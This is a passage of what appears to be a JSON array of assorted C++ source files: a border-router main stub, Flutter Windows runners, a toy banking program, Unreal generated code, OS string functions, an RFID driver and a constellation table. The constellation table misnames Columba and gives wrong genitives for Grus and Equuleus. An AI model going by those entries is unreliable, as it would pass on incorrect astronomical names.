container\n\tnew_end = std::remove_if(args.begin(), args.end(),[](const char *arg) {\n\n\t// std::string::rfind(str, pos)\n\t// str: a given character or a string is to be found\n\t// pos: a position where the search is to be done\n\n\treturn arg != nullptr && std::string(arg).rfind(\"--auto-attach\", 0) == 0; });\n\n\t// Delete empty elements\n\targs.erase(new_end, args.end());\n\tstrcpy(sAutoAttachDisableArgStorage, kAutoAttachDisableArg);\n\targs.push_back(sAutoAttachDisableArgStorage);\n\targs.push_back(nullptr);\n\n\treturn args;\n}\n\nstatic void OnAllocateFailed(void)\n{\n\tprintf(\"Allocate failure, exiting...\");\n\texit(1);\n}\n\nstatic int realmain(int argc, char *argv[])\n{\n\tint opt;\n\tint ret = EXIT_SUCCESS;\n\tconst char *interfaceName = kDefaultInterfaceName;\n\tstd::vector<const char *> radioUrls;\n\t// std::new_handler ser_new_handler(std::new_handler new_p)\n\t// Create a new handler and returns the previously installed handler\n\t// This new_p function is called by allocation functions whenever a memory allocation attemp fails\n\t// The purpose of this method:\n\t//  1. make more memory available\n\t//  2. terminate this program\n\t//  3. throw exception\n\tstd::set_new_handler(OnAllocateFailed);\n\n\twhile ((opt = getopt_long(argc, argv, \"B:d:hI:Vvs\", kOptions, nullptr)) != -1)\n\t{\n\t\tswitch (opt)\n\t\t{\n\t\t\tcase OTBR_OPT_BACKBONE_INTERFACE_NAME:\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase OTBR_OPT_DEBUG_LEVEL:\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase OTBR_OPT_HELP:\n\t\t\t\tbreak;\n\n\t\t\tcase OTBR_OPT_INTERFACE_NAME:\n\t\t\t\tinterfaceName = optarg;\n\t\t\t\tbreak;\n\n\t\t\tcase OTBR_OPT_VERBOSE:\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase OTBR_OPT_SYSLOG_DISABLE:\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase OTBR_OPT_VERSION:\n\t\t\t\tbreak;\n\n\t\t\tcase OTBR_OPT_RADIO_VERSION:\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase OTBR_OPT_AUTO_ATTACH:\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase OTBR_OPT_REST_LISTEN_ADDR:\n\t\t\t\tbreak;\n\n\t\t\tcase OTBR_OPT_REST_LISTEN_PORT:\n\t\t\t\tbreak;\n\n\t\t\tdefault:\n\t\t\t\t// TODO: Print help\n\t\t\t\tExitNow(EXIT_FAILURE);\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\tfor (int i = optind; i < argc; i++)\n\t{\n\t\tprintf(\"Radio URL: %s\\n\", argv[i]);\n\t\tradioUrls.push_back(argv[i]);\n\t}\n\n\t{\n\t\tApplication app;\n\t\tApplication app2 = app;\n\t}\n\n\texit:\n\t\treturn ret;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (setjmp(sResetJump))\n\t{\n\t\tstd::vector<char *> args = AppendAutoAttachDisableArg(argc, argv);\n\t\t\n\t\t// Ensure the program does not receive a SIGALRM unexpectedly.\n\t\talarm(0);\n\n\t\texecvp(args[0], args.data());\n\t}\n\n\treturn realmain(argc, argv);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"instagram\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"petit_weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <cstdlib>  // For rand()\r\n\r\nusing namespace std;\r\n\r\nint total_saving_accounts = 0;\r\nint total_current_accounts = 0;\r\n\r\nclass account {\r\npublic:\r\n    string name_of_account_holder;\r\n    string name_of_joint_account_holder;\r\n    long long int account_number;\r\n    int balance;\r\n    string type_of_account;\r\n    string pin;\r\n\r\npublic:\r\n    // In case of single holder account\r\n    account(string accholdername, int bal, string typeofacc, string pc) {\r\n        account_number = rand() % 100000 + 1000000000;\r\n        name_of_account_holder = accholdername;\r\n        balance = bal;\r\n        type_of_account = typeofacc;\r\n        pin = pc;\r\n        name_of_joint_account_holder = \"No Joint Holder in this account\";\r\n    }\r\n\r\n    // In case of multiple holder account\r\n    account(string accholdername, string jointholdername, int bal, string typeofacc, string pc) {\r\n        account_number = rand() % 100000 + 1000000000;\r\n        name_of_account_holder = accholdername;\r\n        name_of_joint_account_holder = jointholdername;\r\n        balance = bal;\r\n        type_of_account = typeofacc;\r\n        pin = pc;\r\n    }\r\n};\r\n\r\nvector<account> accts;\r\n\r\nvoid display_details(long long int accnum) {\r\n    bool acc_exists = false;\r\n    for (const auto& it : accts) {\r\n        if (it.account_number == accnum) {\r\n            acc_exists = true;\r\n            cout << \"\\nAccount Number : \" << it.account_number;\r\n            cout << \"\\nAccount Holder Name : \" << it.name_of_account_holder;\r\n            cout << \"\\nJoint Holder Name : \" << it.name_of_joint_account_holder;\r\n            cout << \"\\nBalance in your account : \" << it.balance;\r\n            cout << \"\\nType of Account : \" << it.type_of_account;\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Account doesn't exist with the given Account Number.\";\r\n}\r\n\r\nbool create_account(vector<account>& accts) {\r\n    string accholder_name;\r\n    cout << \"\\nENTER YOUR DETAILS HERE : \";\r\n    cout << \"\\nName of Account Holder : \";\r\n    cin >> accholder_name;\r\n\r\n    string str;\r\n    cout << \"\\nDo you want to have a joint holder account? Type YES/NO : \";\r\n    cin >> str;\r\n\r\n    string joint_holder = \"No Joint Holder in this account\";\r\n    if (str == \"YES\") {\r\n        cout << \"Enter the name of Joint Holder : \";\r\n        cin >> joint_holder;\r\n    }\r\n\r\n    string pin;\r\n    cout << \"\\nEnter the pin : \";\r\n    cin >> pin;\r\n\r\n    string typeofacc;\r\n    cout << \"\\nEnter the type of account : \";\r\n    int choice;\r\n    cout << \"1 - Savings Account\\n\";\r\n    cout << \"2 - Current Account\\n\";\r\n    cout << \"Enter your choice here : \";\r\n    cin >> choice;\r\n    typeofacc = (choice == 1) ? \"Savings\" : \"Current\";\r\n\r\n    int balance;\r\n    cout << \"\\nEnter the balance you want to have initially in your account : \";\r\n    cin >> balance;\r\n\r\n    // If it is savings account\r\n    if (typeofacc == \"Savings\") {\r\n        account ob(accholder_name, joint_holder, balance, typeofacc, pin);\r\n        total_saving_accounts++;\r\n        accts.push_back(ob);\r\n        cout << \"\\nACCOUNT CREATED SUCCESSFULLY\\n\";\r\n        display_details(ob.account_number);\r\n        return true;\r\n    }\r\n\r\n    // If it is current account with sufficient balance\r\n    if (typeofacc == \"Current\" && balance >= 10000) {\r\n        account ob(accholder_name, joint_holder, balance, typeofacc, pin);\r\n        total_current_accounts++;\r\n        accts.push_back(ob);\r\n        cout << \"\\nACCOUNT CREATED SUCCESSFULLY\\n\";\r\n        display_details(ob.account_number);\r\n        return true;\r\n    }\r\n\r\n    cout << \"\\nINSUFFICIENT BALANCE\\n\";\r\n    return false;\r\n}\r\n\r\nbool change_pin() {\r\n    long long int accnum;\r\n    cout << \"Enter your account number : \";\r\n    cin >> accnum;\r\n\r\n    for (auto& it : accts) {\r\n        if (it.account_number == accnum) {\r\n            string oldpin;\r\n            cout << \"Enter the old pin : \";\r\n            cin >> oldpin;\r\n\r\n            if (oldpin == it.pin) {\r\n                string newpin;\r\n                cout << \"Enter new pin : \";\r\n                cin >> newpin;\r\n                it.pin = newpin;\r\n                display_details(it.account_number);\r\n                return true;\r\n            } else {\r\n                cout << \"Invalid Pin. Try Again\";\r\n                return false;\r\n            }\r\n        }\r\n    }\r\n\r\n    cout << \"Account doesn't exist with the given Account Number.\";\r\n    return false;\r\n}\r\n\r\nbool deposit_into_account() {\r\n    long long int accnum;\r\n    cout << \"Enter your account number : \";\r\n    cin >> accnum;\r\n\r\n    for (auto& it : accts) {\r\n        if (it.account_number == accnum) {\r\n            string pinfordepo;\r\n            cout << \"Enter the pin : \";\r\n            cin >> pinfordepo;\r\n\r\n            if (pinfordepo == it.pin) {\r\n                int deposit_amount;\r\n                cout << \"Enter the amount you want to deposit : \";\r\n                cin >> deposit_amount;\r\n                it.balance += deposit_amount;\r\n                cout << \"Your Updated details : \";\r\n   ",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n/*===========================================================================\n\tGenerated code exported from UnrealHeaderTool.\n\tDO NOT modify this manually! Edit the corresponding .h files instead!\n===========================================================================*/\n\n#include \"UObject/GeneratedCppIncludes.h\"\n#include \"FPS/Public/Items/ItemMaster.h\"\nPRAGMA_DISABLE_DEPRECATION_WARNINGS\nvoid EmptyLinkFunctionForGeneratedCodeItemMaster() {}\n\n// Begin Cross Module References\nENGINE_API UClass* Z_Construct_UClass_UTexture2D_NoRegister();\nFPS_API UClass* Z_Construct_UClass_AInteractMaster();\nFPS_API UClass* Z_Construct_UClass_AItemMaster();\nFPS_API UClass* Z_Construct_UClass_AItemMaster_NoRegister();\nFPS_API UClass* Z_Construct_UClass_UItemInfo_NoRegister();\nFPS_API UEnum* Z_Construct_UEnum_FPS_EItemType();\nFPS_API UScriptStruct* Z_Construct_UScriptStruct_FItemStructMaster();\nUPackage* Z_Construct_UPackage__Script_FPS();\n// End Cross Module References\n\n// Begin ScriptStruct FItemStructMaster\nstatic FStructRegistrationInfo Z_Registration_Info_UScriptStruct_ItemStructMaster;\nclass UScriptStruct* FItemStructMaster::StaticStruct()\n{\n\tif (!Z_Registration_Info_UScriptStruct_ItemStructMaster.OuterSingleton)\n\t{\n\t\tZ_Registration_Info_UScriptStruct_ItemStructMaster.OuterSingleton = GetStaticStruct(Z_Construct_UScriptStruct_FItemStructMaster, (UObject*)Z_Construct_UPackage__Script_FPS(), TEXT(\"ItemStructMaster\"));\n\t}\n\treturn Z_Registration_Info_UScriptStruct_ItemStructMaster.OuterSingleton;\n}\ntemplate<> FPS_API UScriptStruct* StaticStruct<FItemStructMaster>()\n{\n\treturn FItemStructMaster::StaticStruct();\n}\nstruct Z_Construct_UScriptStruct_FItemStructMaster_Statics\n{\n#if WITH_METADATA\n\tstatic constexpr UECodeGen_Private::FMetaDataPairParam Struct_MetaDataParams[] = {\n\t\t{ \"BlueprintType\", \"true\" },\n#if !UE_BUILD_SHIPPING\n\t\t{ \"Comment\", \"//-----------------------------------------------------------------------------------------------------------\\n\" },\n#endif\n\t\t{ \"ModuleRelativePath\", \"Public/Items/ItemMaster.h\" },\n\t};\n#endif // WITH_METADATA\n\tstatic void* NewStructOps()\n\t{\n\t\treturn (UScriptStruct::ICppStructOps*)new UScriptStruct::TCppStructOps<FItemStructMaster>();\n\t}\n\tstatic const UECodeGen_Private::FStructParams StructParams;\n};\nconst UECodeGen_Private::FStructParams Z_Construct_UScriptStruct_FItemStructMaster_Statics::StructParams = {\n\t(UObject* (*)())Z_Construct_UPackage__Script_FPS,\n\tnullptr,\n\t&NewStructOps,\n\t\"ItemStructMaster\",\n\tnullptr,\n\t0,\n\tsizeof(FItemStructMaster),\n\talignof(FItemStructMaster),\n\tRF_Public|RF_Transient|RF_MarkAsNative,\n\tEStructFlags(0x00000001),\n\tMETADATA_PARAMS(UE_ARRAY_COUNT(Z_Construct_UScriptStruct_FItemStructMaster_Statics::Struct_MetaDataParams), Z_Construct_UScriptStruct_FItemStructMaster_Statics::Struct_MetaDataParams)\n};\nUScriptStruct* Z_Construct_UScriptStruct_FItemStructMaster()\n{\n\tif (!Z_Registration_Info_UScriptStruct_ItemStructMaster.InnerSingleton)\n\t{\n\t\tUECodeGen_Private::ConstructUScriptStruct(Z_Registration_Info_UScriptStruct_ItemStructMaster.InnerSingleton, Z_Construct_UScriptStruct_FItemStructMaster_Statics::StructParams);\n\t}\n\treturn Z_Registration_Info_UScriptStruct_ItemStructMaster.InnerSingleton;\n}\n// End ScriptStruct FItemStructMaster\n\n// Begin Class AItemMaster\nvoid AItemMaster::StaticRegisterNativesAItemMaster()\n{\n}\nIMPLEMENT_CLASS_NO_AUTO_REGISTRATION(AItemMaster);\nUClass* Z_Construct_UClass_AItemMaster_NoRegister()\n{\n\treturn AItemMaster::StaticClass();\n}\nstruct Z_Construct_UClass_AItemMaster_Statics\n{\n#if WITH_METADATA\n\tstatic constexpr UECodeGen_Private::FMetaDataPairParam Class_MetaDataParams[] = {\n#if !UE_BUILD_SHIPPING\n\t\t{ \"Comment\", \"//-----------------------------------------------------------------------------------------------------------\\n\" },\n#endif\n\t\t{ \"IncludePath\", \"Items/ItemMaster.h\" },\n\t\t{ \"ModuleRelativePath\", \"Public/Items/ItemMaster.h\" },\n\t};\n\tstatic constexpr UECodeGen_Private::FMetaDataPairParam NewProp_ItemCount_MetaData[] = {\n\t\t{ \"Category\", \"Item Master\" },\n\t\t{ \"ModuleRelativePath\", \"Public/Items/ItemMaster.h\" },\n\t};\n\tstatic constexpr UECodeGen_Private::FMetaDataPairParam NewProp_ItemCountMax_MetaData[] = {\n\t\t{ \"Category\", \"Item Master\" },\n\t\t{ \"ModuleRelativePath\", \"Public/Items/ItemMaster.h\" },\n\t};\n\tstatic constexpr UECodeGen_Private::FMetaDataPairParam NewProp_ItemWeight_MetaData[] = {\n\t\t{ \"Category\", \"Item Master\" },\n\t\t{ \"ModuleRelativePath\", \"Public/Items/ItemMaster.h\" },\n\t};\n\tstatic constexpr UECodeGen_Private::FMetaDataPairParam NewProp_ItemType_MetaData[] = {\n\t\t{ \"Category\", \"Item Master\" },\n\t\t{ \"ModuleRelativePath\", \"Public/Items/ItemMaster.h\" },\n\t};\n\tstatic constexpr UECodeGen_Private::FMetaDataPairParam NewProp_ItemName_MetaData[] = {\n\t\t{ \"Category\", \"Item Master\" },\n\t\t{ \"ModuleRelativePath\", \"Public/Items/ItemMaster.h\" },\n\t};\n\tstatic constexpr UECodeGen_Private::FMetaDataPairParam NewProp_ItemDesc_MetaData[] = {\n\t\t{ \"Category\", \"Item Master\" },\n\t\t{ \"ModuleRelativePath\", \"Public/Items/",
    "/*\nSphynx Operating System\n\nFile: string.cpp\nAuthor: Kevin Alavik\nYear: 2024\n\nLicense: MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\nDescription: POSIX C string functions\n*/\n\n#include <string.hpp>\n\nextern \"C\" void* memset(void* d, int c, size_t n) {\n    unsigned char* p = static_cast<unsigned char*>(d);\n    while (n--) {\n        *p++ = static_cast<unsigned char>(c);\n    }\n    return d;\n}\n\nextern \"C\" void* memcpy(void* dest, const void* src, size_t n) {\n    unsigned char* p1 = static_cast<unsigned char*>(dest);\n    const unsigned char* p2 = static_cast<const unsigned char*>(src);\n    while (n--) {\n        *p1++ = *p2++;\n    }\n    return dest;\n}\n\nextern \"C\" void* memmove(void* dest, const void* src, size_t n) {\n    unsigned char* p1 = static_cast<unsigned char*>(dest);\n    const unsigned char* p2 = static_cast<const unsigned char*>(src);\n\n    if (p1 < p2) {\n        while (n--) {\n            *p1++ = *p2++;\n        }\n    } else {\n        p1 += n;\n        p2 += n;\n        while (n--) {\n            *--p1 = *--p2;\n        }\n    }\n    return dest;\n}\n\nextern \"C\" size_t strlen(const char* s) {\n    const char* p = s;\n    while (*p) {\n        ++p;\n    }\n    return p - s;\n}\n\nextern \"C\" int strcmp(const char* s1, const char* s2) {\n    while (*s1 && (*s1 == *s2)) {\n        ++s1;\n        ++s2;\n    }\n    return static_cast<unsigned char>(*s1) - static_cast<unsigned char>(*s2);\n}\n\nextern \"C\" char* strcpy(char* dest, const char* src) {\n    char* d = dest;\n    while ((*d++ = *src++));\n    return dest;\n}\n\nextern \"C\" char* strcat(char* dest, const char* src) {\n    char* d = dest;\n    while (*d) {\n        ++d;\n    }\n    while ((*d++ = *src++));\n    return dest;\n}\n\nextern \"C\" const char* strchr(const char* s, int c) {\n    while (*s) {\n        if (*s == static_cast<char>(c)) {\n            return s;\n        }\n        ++s;\n    }\n    return nullptr;\n}\n\nextern \"C\" const char* strrchr(const char* s, int c) {\n    const char* last_occurrence = nullptr;\n    while (*s) {\n        if (*s == static_cast<char>(c)) {\n            last_occurrence = s;\n        }\n        ++s;\n    }\n    return last_occurrence;\n}\n\nextern \"C\" const char* strstr(const char* haystack, const char* needle) {\n    if (!*needle) {\n        return haystack;\n    }\n    for (; *haystack; ++haystack) {\n        if ((*haystack == *needle) && (strcmp(haystack, needle) == 0)) {\n            return haystack;\n        }\n    }\n    return nullptr;\n}\n\nextern \"C\" char* strncpy(char* dest, const char* src, size_t n) {\n    char* d = dest;\n    while (n && (*d++ = *src++)) {\n        --n;\n    }\n    if (n) {\n        while (--n) {\n            *d++ = '\\0';\n        }\n    }\n    return dest;\n}\n\nextern \"C\" int strncmp(const char* s1, const char* s2, size_t n) {\n    while (n && *s1 && (*s1 == *s2)) {\n        ++s1;\n        ++s2;\n        --n;\n    }\n    return (n == 0) ? 0 : static_cast<unsigned char>(*s1) - static_cast<unsigned char>(*s2);\n}\n",
    "/*\n* MFRC522_SPI.cpp - Library to use ARDUINO RFID MODULE KIT 13.56 MHZ WITH TAGS SPI W AND R BY COOQROBOT.\n* NOTE: Please also check the comments in MFRC522_SPI.h - they provide useful hints and background information.\n* Released into the public domain.\n*/\n\n#include <Arduino.h>\n#include <MFRC522.h>\n\n/**\n * Writes a byte to the specified register in the MFRC522_SPI chip.\n * The interface is described in the datasheet section 8.1.2.\n */\nvoid MFRC522_SPI::PCD_WriteRegister(\tMFRC522::PCD_Register reg,\t///< The register to write to. One of the PCD_Register enums.\n\t\t\t\t\t\t\t\t\tbyte value\t\t\t///< The value to write.\n\t\t\t\t\t\t\t\t) {\n\t_spiClass->beginTransaction(_spiSettings);\t// Set the settings to work with SPI bus\n\tdigitalWrite(_chipSelectPin, LOW);\t\t// Select slave\n\t_spiClass->transfer(reg << 1);\t\t\t\t\t\t// MSB == 0 is for writing. LSB is not used in address. Datasheet section 8.1.2.3.\n\t_spiClass->transfer(value);\n\tdigitalWrite(_chipSelectPin, HIGH);\t\t// Release slave again\n\t_spiClass->endTransaction(); // Stop using the SPI bus\n} // End PCD_WriteRegister()\n\n/**\n * Writes a number of bytes to the specified register in the MFRC522_SPI chip.\n * The interface is described in the datasheet section 8.1.2.\n */\nvoid MFRC522_SPI::PCD_WriteRegister(\tMFRC522::PCD_Register reg,\t///< The register to write to. One of the PCD_Register enums.\n\t\t\t\t\t\t\t\t\tbyte count,\t\t\t///< The number of bytes to write to the register\n\t\t\t\t\t\t\t\t\tbyte *values\t\t///< The values to write. Byte array.\n\t\t\t\t\t\t\t\t) {\n\t_spiClass->beginTransaction(_spiSettings);\t// Set the settings to work with SPI bus\n\tdigitalWrite(_chipSelectPin, LOW);\t\t// Select slave\n\t_spiClass->transfer(reg << 1);\t\t\t\t\t\t// MSB == 0 is for writing. LSB is not used in address. Datasheet section 8.1.2.3.\n\tfor (byte index = 0; index < count; index++) {\n\t\t_spiClass->transfer(values[index]);\n\t}\n\tdigitalWrite(_chipSelectPin, HIGH);\t\t// Release slave again\n\t_spiClass->endTransaction(); // Stop using the SPI bus\n} // End PCD_WriteRegister()\n\n/**\n * Reads a byte from the specified register in the MFRC522_SPI chip.\n * The interface is described in the datasheet section 8.1.2.\n */\nbyte MFRC522_SPI::PCD_ReadRegister(\tMFRC522::PCD_Register reg\t///< The register to read from. One of the PCD_Register enums.\n\t\t\t\t\t\t\t\t) {\n\tbyte value;\n\t_spiClass->beginTransaction(_spiSettings);\t// Set the settings to work with SPI bus\n\tdigitalWrite(_chipSelectPin, LOW);\t\t\t// Select slave\n\t_spiClass->transfer(0x80 | (reg << 1));\t\t\t\t\t// MSB == 1 is for reading. LSB is not used in address. Datasheet section 8.1.2.3\n\tvalue = _spiClass->transfer(0);\t\t\t\t\t// Read the value back. Send 0 to stop reading.\n\tdigitalWrite(_chipSelectPin, HIGH);\t\t\t// Release slave again\n\t_spiClass->endTransaction(); // Stop using the SPI bus\n\treturn value;\n} // End PCD_ReadRegister()\n\n/**\n * Reads a number of bytes from the specified register in the MFRC522_SPI chip.\n * The interface is described in the datasheet section 8.1.2.\n */\nvoid MFRC522_SPI::PCD_ReadRegister(\tMFRC522::PCD_Register reg,\t///< The register to read from. One of the PCD_Register enums.\n\t\t\t\t\t\t\t\tbyte count,\t\t\t///< The number of bytes to read\n\t\t\t\t\t\t\t\tbyte *values,\t\t///< Byte array to store the values in.\n\t\t\t\t\t\t\t\tbyte rxAlign\t\t///< Only bit positions rxAlign..7 in values[0] are updated.\n\t\t\t\t\t\t\t\t) {\n\tif (count == 0) {\n\t\treturn;\n\t}\n\t//Serial.print(F(\"Reading \")); \tSerial.print(count); Serial.println(F(\" bytes from register.\"));\n\tbyte address = 0x80 | (reg << 1);\t\t\t\t// MSB == 1 is for reading. LSB is not used in address. Datasheet section 8.1.2.3.\n\tbyte index = 0;\t\t\t\t\t\t\t// Index in values array.\n\t_spiClass->beginTransaction(_spiSettings);\t// Set the settings to work with SPI bus\n\tdigitalWrite(_chipSelectPin, LOW);\t\t// Select slave\n\tcount--;\t\t\t\t\t\t\t\t// One read is performed outside of the loop\n\t_spiClass->transfer(address);\t\t\t\t\t// Tell MFRC522_SPI which address we want to read\n\tif (rxAlign) {\t\t// Only update bit positions rxAlign..7 in values[0]\n\t\t// Create bit mask for bit positions rxAlign..7\n\t\tbyte mask = (0xFF << rxAlign) & 0xFF;\n\t\t// Read value and tell that we want to read the same address again.\n\t\tbyte value = _spiClass->transfer(address);\n\t\t// Apply mask to both current value of values[0] and the new data in value.\n\t\tvalues[0] = (values[0] & ~mask) | (value & mask);\n\t\tindex++;\n\t}\n\twhile (index < count) {\n\t\tvalues[index] = _spiClass->transfer(address);\t// Read value and tell that we want to read the same address again.\n\t\tindex++;\n\t}\n\tvalues[index] = _spiClass->transfer(0);\t\t\t// Read the final byte. Send 0 to stop reading.\n\tdigitalWrite(_chipSelectPin, HIGH);\t\t\t// Release slave again\n\t_spiClass->endTransaction(); // Stop using the SPI bus\n} // End PCD_ReadRegister()\n\nbool MFRC522_SPI::PCD_Init() {\n        // Set the chipSelectPin as digital output, do not select the slave yet\n\t_spiClass->begin();\n\n        pinMode(_chipSelectPin, OUTPUT);\n        digitalWrite(_chipSelectPin, HIGH);\n\n        // If a valid pin number has been set, pull device out of power down / reset state.\n        if (_resetPowerDown",
    "#include \"Constellation.h\"\n\nnamespace SCT\n{\n\nstruct ConstellationData\n{\n\tConstellation constellation;\n\tstd::string abbreviation;\n\tstd::string name;\n\tstd::string genitive;\n};\n\nstatic const ConstellationData kConstellationData[89] =\n{\n\t{ Unknown, \"???\", \"Unknown\", \"\" },\n\t{ Andromeda, \"And\", \"Andromeda\", \"Andromedae\" },\n\t{ Antlia, \"Ant\", \"Antlia\", \"Antliae\" },\n\t{ Apus, \"Aps\", \"Apus\", \"Apodis\" },\n\t{ Aquarius, \"Aqr\", \"Aquarius\", \"Aquarii\" },\n\t{ Aquila, \"Aql\", \"Aquila\", \"Aquilae\" },\n\t{ Ara, \"Ara\", \"Ara\", \"Arae\" },\n\t{ Aries, \"Ari\", \"Aries\", \"Arietis\" },\n\t{ Auriga, \"Aur\", \"Auriga\", \"Aurigae\" },\n\t{ Bootes, \"Boo\", \"Bootes\", \"Bootis\" },\n\t{ Caelum, \"Cae\", \"Caelum\", \"Caeli\" },\n\t{ Camelopardalis, \"Cam\", \"Camelopardalis\", \"Camelopardalis\" },\n\t{ Cancer, \"Cnc\", \"Cancer\", \"Cancri\" },\n\t{ Canes_Venatici, \"CVn\", \"Canes Venatici\", \"Canes Venaticorum\" },\n\t{ Canis_Major, \"CMa\", \"Canis Major\", \"Canis Majoris\" },\n\t{ Canis_Minor, \"CMi\", \"Canis Minor\", \"Canis Minoris\" },\n\t{ Capricornus, \"Cap\", \"Capricornus\", \"Capricorni\" },\n\t{ Carina, \"Car\", \"Carina\", \"Carinae\" },\n\t{ Cassiopeia, \"Cas\", \"Cassiopeia\", \"Cassiopeiae\" },\n\t{ Centaurus, \"Cen\", \"Centaurus\", \"Centauri\" },\n\t{ Cepheus, \"Cep\", \"Cepheus\", \"Cephei\" },\n\t{ Cetus, \"Cet\", \"Cetus\", \"Ceti\" },\n\t{ Chamaeleon, \"Cha\", \"Chamaeleon\", \"Chamaeleontis\" },\n\t{ Circinus, \"Cir\", \"Circinus\", \"Circini\" },\n\t{ Columbia, \"Col\", \"Columbia\", \"Columbi\" },\n\t{ Coma_Berenices, \"Com\", \"Coma Berenices\", \"Comae Berenices\" },\n\t{ Corona_Australis, \"CrA\", \"Corona Australis\", \"Coronae Australis\" },\n\t{ Corona_Borealis, \"CrB\", \"Corona Borealis\", \"Coronae Borealis\" },\n\t{ Corvus, \"Crv\", \"Corvus\", \"Corvi\" },\n\t{ Crater, \"Crt\", \"Crater\", \"Crateris\" },\n\t{ Crux, \"Cru\", \"Crux\", \"Crucis\" },\n\t{ Cygnus, \"Cyg\", \"Cygnus\", \"Cygni\" },\n\t{ Delphinus, \"Del\", \"Delphinus\", \"Delphini\" },\n\t{ Dorado, \"Dor\", \"Dorado\", \"Doradus\" },\n\t{ Draco, \"Dra\", \"Draco\", \"Draconis\" },\n\t{ Equuleus, \"Equ\", \"Equuleus\", \"Equuleui\" },\n\t{ Eridanus, \"Eri\", \"Eridanus\", \"Eridani\" },\n\t{ Fornax, \"For\", \"Fornax\", \"Fornacis\" },\n\t{ Gemini, \"Gem\", \"Gemini\", \"Geminorum\" },\n\t{ Grus, \"Gru\", \"Grus\", \"Grucis\" },\n\t{ Hercules, \"Her\", \"Hercules\", \"Herculis\" },\n\t{ Horologium, \"Hor\", \"Horologium\", \"Horologii\" },\n\t{ Hydra, \"Hya\", \"Hydra\", \"Hydrae\" },\n\t{ Hydrus, \"Hyi\", \"Hydrus\", \"Hydri\" },\n\t{ Indus, \"Ind\", \"Indus\", \"Indi\" },\n\t{ Lacerta, \"Lac\", \"Lacerta\", \"Lacertae\" },\n\t{ Leo, \"Leo\", \"Leo\", \"Leonis\" },\n\t{ Leo_Minor, \"LMi\", \"Leo Minor\", \"Leo Minoris\" },\n\t{ Lepus, \"Lep\", \"Lepus\", \"Leporis\" },\n\t{ Libra, \"Lib\", \"Libra\", \"Librae\" },\n\t{ Lupus, \"Lup\", \"Lupus\", \"Lupi\" },\n\t{ Lynx, \"Lyn\", \"Lynx\", \"Lyncis\" },\n\t{ Lyra, \"Lyr\", \"Lyra\", \"Lyrae\" },\n\t{ Mensa, \"Men\", \"Mensa\", \"Mensae\" },\n\t{ Microscopium, \"Mic\", \"Microscopium\", \"Microscopii\" 